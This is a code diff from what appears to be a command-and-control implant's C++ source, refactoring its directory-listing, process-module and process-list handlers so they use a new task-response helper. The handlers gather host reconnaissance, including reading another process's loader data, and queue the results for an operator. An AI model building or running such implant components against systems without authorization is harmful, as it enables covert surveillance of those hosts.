@@ -14,7 +14,7 @@ namespace Commands {
     VOID DirectoryList (_parser *const parser) {
         HEXANE
 
-        _stream *out = Stream::CreateStreamWithHeaders(TypeResponse);
+        _stream *out = Stream::CreateTaskResponse(DIRECTORYLIST);
 
         ULONG length    = { };
         LPSTR query     = { };
@@ -26,7 +26,6 @@ namespace Commands {
         SYSTEMTIME          access_time = { };
         SYSTEMTIME          sys_time    = { };
 
-        Stream::PackDword(out, DIRECTORYLIST);
         query   = Parser::UnpackString(parser, nullptr);
         path    = R_CAST(char*, x_malloc(MAX_PATH));
 
@@ -79,23 +78,22 @@ namespace Commands {
     VOID ProcessModules (_parser *const parser) {
         HEXANE
 
-        _stream *out = Stream::CreateStreamWithHeaders(TypeResponse);
-        Stream::PackDword(out, PROCESSMODULES);
+        _stream *out = Stream::CreateTaskResponse(PROCESSMODULES);
 
-        PPEB_LDR_DATA loads             = { };
-        PROCESS_BASIC_INFORMATION pbi   = { };
-        HANDLE process                  = { };
-        ULONG pid                       = { };
+        PPEB_LDR_DATA               loads   = { };
+        HANDLE                      process = { };
+        ULONG                       pid     = { };
+        PROCESS_BASIC_INFORMATION   pbi     = { };
 
-        PLIST_ENTRY head 	            = { };
-        PLIST_ENTRY entry               = { };
-        LDR_DATA_TABLE_ENTRY module     = { };
+        PLIST_ENTRY                 head 	= { };
+        PLIST_ENTRY                 entry   = { };
+        LDR_DATA_TABLE_ENTRY        module  = { };
 
-        CHAR modname_a[MAX_PATH] 		= { };
-        WCHAR modname_w[MAX_PATH] 	    = { };
+        CHAR    modname_a[MAX_PATH] = { };
+        WCHAR   modname_w[MAX_PATH] = { };
 
-        INT count = 0;
-        SIZE_T size = 0;
+        INT     count   = 0;
+        SIZE_T  size    = 0;
 
         x_assert(pid = Process::GetProcessIdByName(Parser::UnpackString(parser, nullptr)));
         x_ntassert(Process::NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid));
@@ -135,8 +133,7 @@ namespace Commands {
     VOID ProcessList(_parser *const parser) {
         HEXANE
 
-        _stream *out = Stream::CreateStreamWithHeaders(TypeResponse);
-        Stream::PackDword(out, PROCESSLIST);
+        _stream *out = Stream::CreateTaskResponse(PROCESSLIST);
 
         PROCESSENTRY32  entries     = { };
         HANDLE          snapshot    = { };
@@ -205,9 +202,7 @@ namespace Commands {
         Dispatcher::MessageQueue(out);
 
         defer:
-        if (snapshot) {
-            Ctx->nt.NtClose(snapshot);
-        }
+        if (snapshot) { Ctx->nt.NtClose(snapshot); }
     }
 
     VOID AddPeer(_parser *parser) {
